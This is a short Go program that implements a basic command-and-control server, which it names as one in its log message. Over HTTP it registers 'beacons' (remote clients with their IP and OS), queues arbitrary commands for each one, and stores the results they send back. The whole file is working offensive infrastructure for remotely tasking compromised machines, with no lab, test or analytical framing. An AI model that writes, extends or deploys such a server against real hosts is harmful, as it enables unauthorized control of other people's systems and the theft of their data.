package main

import (
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"sync"
	"time"
)

// Beacon represents a connected client
type Beacon struct {
	ID        string    `json:"id"`
	IP        string    `json:"ip"`
	OS        string    `json:"os"`
	LastSeen  time.Time `json:"last_seen"`
	Tasks     []Task    `json:"tasks"`
	TaskQueue []Task    `json:"task_queue"`
}

// Task represents a command to be executed by a beacon
type Task struct {
	ID        string    `json:"id"`
	Command   string    `json:"command"`
	Args      []string  `json:"args"`
	Status    string    `json:"status"`
	CreatedAt time.Time `json:"created_at"`
	Result    string    `json:"result,omitempty"`
}

var (
	beacons = make(map[string]*Beacon)
	mutex   sync.RWMutex
)

func main() {
	// Register HTTP handlers
	http.HandleFunc("/register", handleRegister)
	http.HandleFunc("/tasks", handleTasks)
	http.HandleFunc("/results", handleResults)

	// Start the server
	port := 8080
	log.Printf("Starting C2 server on port %d...\n", port)
	if err := http.ListenAndServe(fmt.Sprintf(":%d", port), nil); err != nil {
		log.Fatalf("Failed to start server: %v", err)
	}
}

func handleRegister(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var beacon Beacon
	if err := json.NewDecoder(r.Body).Decode(&beacon); err != nil {
		http.Error(w, "Invalid request body", http.StatusBadRequest)
		return
	}

	mutex.Lock()
	beacons[beacon.ID] = &beacon
	mutex.Unlock()

	log.Printf("New beacon registered: %s (%s)", beacon.ID, beacon.OS)
	w.WriteHeader(http.StatusOK)
}

func handleTasks(w http.ResponseWriter, r *http.Request) {
	beaconID := r.URL.Query().Get("id")
	if beaconID == "" {
		http.Error(w, "Missing beacon ID", http.StatusBadRequest)
		return
	}

	mutex.RLock()
	beacon, exists := beacons[beaconID]
	mutex.RUnlock()

	if !exists {
		http.Error(w, "Beacon not found", http.StatusNotFound)
		return
	}

	switch r.Method {
	case http.MethodGet:
		// Return pending tasks
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(beacon.TaskQueue)
	case http.MethodPost:
		// Create new task
		var task Task
		if err := json.NewDecoder(r.Body).Decode(&task); err != nil {
			http.Error(w, "Invalid request body", http.StatusBadRequest)
			return
		}

		task.CreatedAt = time.Now()
		task.Status = "pending"

		mutex.Lock()
		beacon.Tasks = append(beacon.Tasks, task)
		beacon.TaskQueue = append(beacon.TaskQueue, task)
		mutex.Unlock()

		log.Printf("New task created for beacon %s: %s", beaconID, task.Command)
		w.WriteHeader(http.StatusCreated)
	default:
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
	}
}

func handleResults(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	var result struct {
		BeaconID string `json:"beacon_id"`
		TaskID   string `json:"task_id"`
		Result   string `json:"result"`
	}

	if err := json.NewDecoder(r.Body).Decode(&result); err != nil {
		http.Error(w, "Invalid request body", http.StatusBadRequest)
		return
	}

	mutex.Lock()
	defer mutex.Unlock()

	beacon, exists := beacons[result.BeaconID]
	if !exists {
		http.Error(w, "Beacon not found", http.StatusNotFound)
		return
	}

	// Update task result
	for i, task := range beacon.Tasks {
		if task.ID == result.TaskID {
			beacon.Tasks[i].Result = result.Result
			beacon.Tasks[i].Status = "completed"
			break
		}
	}

	// Remove task from queue
	for i, task := range beacon.TaskQueue {
		if task.ID == result.TaskID {
			beacon.TaskQueue = append(beacon.TaskQueue[:i], beacon.TaskQueue[i+1:]...)
			break
		}
	}

	w.WriteHeader(http.StatusOK)
} 